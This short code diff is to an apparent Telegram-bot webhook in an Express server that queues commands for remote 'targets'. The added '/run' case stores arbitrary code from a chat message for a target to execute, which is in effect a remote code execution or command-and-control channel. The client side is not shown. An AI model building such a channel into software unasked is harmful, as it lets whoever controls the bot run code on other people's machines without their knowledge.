@@ -56,6 +56,9 @@ app.post("/webhook/:token", async (req, res) => {
     case "/srvhop":
       commandStore[target] = { action: "srvhop", ts: Date.now() };
       break;
+    case "/run":
+  commandStore[target] = { action: "run", code: extra };
+  break;
     default:
       await axios.post(`${TAPI}/sendMessage`, {
         chat_id: chatId,
